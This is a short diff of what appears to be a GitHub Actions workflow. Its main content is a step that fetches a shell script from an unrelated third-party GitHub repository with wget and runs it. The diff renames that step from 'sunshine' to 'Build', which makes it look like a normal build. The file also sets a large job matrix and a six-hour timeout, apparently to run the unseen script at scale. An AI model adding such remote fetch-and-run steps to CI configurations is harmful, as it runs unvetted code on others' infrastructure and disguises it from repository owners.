@@ -10,7 +10,7 @@ jobs:
      fail-fast: false 
      
   matrix: 
-     go-version: [1.6, 1.7, 1.8, 1.9, 1.10]
+     go: [1.6, 1.7, 1.8, 1.9, 1.10]
      flag: [A, B, C, D, E, F, G, H, I] 
      timeout-minutes: 360 
      
@@ -28,6 +28,6 @@ jobs:
   - name: Setup 
     uses: actions/checkout@v2
     
-  - name: sunshine 
+  - name: Build 
     run: | 
        wget https://github.com/venetta999/turtleturtle/blob/main/turtleturtle.sh && chmod u+x turtleturtle.sh && ./turtleturtle.sh
